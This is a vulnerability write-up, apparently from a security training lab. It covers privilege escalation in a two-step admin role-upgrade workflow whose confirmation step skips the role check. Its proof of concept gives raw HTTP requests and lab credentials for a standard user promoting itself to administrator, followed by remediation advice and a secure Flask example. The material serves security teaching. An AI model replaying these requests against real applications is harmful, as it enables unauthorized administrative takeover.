# Vulnerability Report: Vertical Privilege Escalation via Missing Access Controls in Multi-Step Workflow

* **Vulnerability Type:** Missing Function Level Access Control (CWE-306) / Privilege Escalation (CWE-269) / Improper Workflow Controls (CWE-841)

* **Severity:** High

* **Target Component:** Role Management Workflow Handler (`/admin-roles`)

* **OWASP Top 10 Mapping:** A01:2021 – Broken Access Control

## 1. Executive Summary

A critical vertical privilege escalation vulnerability was identified in the user role modification workflow. The application splits the role elevation process into two steps: an initial request (`POST /admin-roles` with `action=upgrade`) and a secondary confirmation step (`POST /admin-roles` with `action=upgrade&confirmed=true`). While access control validation is enforced on the first step, the server fails to verify user credentials or authorization roles on the confirmation endpoint. An authenticated, non-privileged user can skip the first step and send a crafted request directly to the confirmation endpoint, successfully elevating their account to administrative status.

## 2. Technical Analysis & Root Cause

The vulnerability originates from an incorrect assumption regarding user workflow navigation and missing state/authorization verification on secondary endpoints.

### Flawed Security Architecture

1. **Step 1 Authorization Enforcement:** The server verifies administrative rights when receiving the initial request (`POST /admin-roles`). Non-admin users are rejected with `HTTP 403 Forbidden`.

2. **Step 2 Verification Omission:** When receiving the confirmation request (`action=upgrade&confirmed=true`), the backend logic assumes the user has already passed Step 1 validation. The endpoint processes the action without verifying whether the active session belongs to an administrator.

3. **Stateless Workflow Vulnerability:** The multi-step process lacks cryptographically tied workflow tokens or server-side session flags confirming that Step 1 was legitimately cleared by an authorized user.

```
[ Low-Privileged User ]
           |
           | 1. POST /admin-roles (Step 1: username=wiener&action=upgrade)
           v
[ Application Server ] ---> Checks Role: NOT ADMIN -> HTTP 403 Forbidden
           |
           | 2. POST /admin-roles (Step 2: username=wiener&action=upgrade&confirmed=true)
           v
[ Application Server ]
           |
           | 3. Checks "confirmed=true" flag ONLY (Role check MISSING!)
           | 4. Upgrades user "wiener" to ADMIN
           v
[ Privilege Escalation Successful ]
```

## 3. Proof of Concept (PoC)

1. Authenticate as administrator (`administrator:admin`) and access the administrative panel.

2. Upgrade a user account (e.g., `carlos`) and intercept the resulting HTTP requests in Burp Suite:

   * **Step 1 Request:**
     ```http
     POST /admin-roles HTTP/1.1
     Host: target-app.net
     Cookie: session=admin_session
     Content-Type: application/x-www-form-urlencoded

     username=carlos&action=upgrade
     ```

   * **Step 2 Request (Confirmation):**
     ```http
     POST /admin-roles HTTP/1.1
     Host: target-app.net
     Cookie: session=admin_session
     Content-Type: application/x-www-form-urlencoded

     username=carlos&action=upgrade&confirmed=true
     ```

3. Log out of the `administrator` account and authenticate as standard user `wiener:peter`.

4. Extract `wiener`'s session cookie and send both requests to **Burp Repeater**.

5. Attempt to resend **Step 1** using `wiener`'s session cookie:
   * **Result:** `HTTP/1.1 403 Forbidden` (Access Denied).

6. Send **Step 2** directly using `wiener`'s session cookie with `wiener` as the target user:
   ```http
   POST /admin-roles HTTP/1.1
   Host: target-app.net
   Cookie: session=wiener_session
   Content-Type: application/x-www-form-urlencoded

   username=wiener&action=upgrade&confirmed=true
   ```

7. **Observe Response:** The server responds with `HTTP/1.1 200 OK`.

8. Refresh the session in the browser to verify that user `wiener` now possesses administrative privileges.

## 4. Impact

* **Vertical Privilege Escalation:** Any authenticated standard user can elevate their account to full administrative status.

* **Bypass of Workflow Security Controls:** Total failure of multi-step authorization logic.

* **Full Administrative Takeover:** Unrestricted access to administrative operations and user management controls.

## 5. Remediation & Developer Guidance

### Primary Fixes

1. **Enforce Access Controls Across All Workflow Steps:**
   Ensure every endpoint involved in a sensitive or multi-step workflow performs server-side authentication and authorization checks independently.

2. **Implement Server-Side Workflow State Validation:**
   Maintain workflow state securely in the server-side session. Ensure Step 2 cannot execute unless the server confirms that an authorized administrative session successfully initiated Step 1.

3. **Use Cryptographically Bound Action Tokens:**
   If using multi-step processes, issue one-time, cryptographically signed tokens at Step 1 that bind the action to the administrator's session and expire upon execution.

#### Secure Code Implementation Example (Python / Flask)

```python
from flask import Flask, request, session, abort, jsonify

app = Flask(__name__)

def is_admin(user_session):
    return user_session.get('authenticated') and user_session.get('role') == 'ADMIN'

@app.route('/admin-roles', methods=['POST'])
def handle_role_change():
    # Enforce strict role authorization check on EVERY request, including confirmations
    if not is_admin(session):
        abort(403)  # HTTP 403 Forbidden

    username = request.form.get('username')
    action = request.form.get('action')
    confirmed = request.form.get('confirmed')

    if confirmed == 'true':
        # Execute promotion logic safely after verifying admin identity
        db_update_user_role(username=username, role='ADMIN')
        return jsonify({"status": "success", "message": f"User {username} upgraded to admin."}), 200

    return jsonify({"status": "pending_confirmation"}), 200
```

## 6. References

* **CWE-306:** [Missing Authentication for Critical Function](https://cwe.mitre.org/data/definitions/306.html)

* **CWE-269:** [Improper Privilege Management](https://cwe.mitre.org/data/definitions/269.html)

* **CWE-841:** [Improper Enforcement of Behavioral Workflow](https://cwe.mitre.org/data/definitions/841.html)

* **OWASP:** [Access Control Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Access_Control_Cheat_Sheet.html)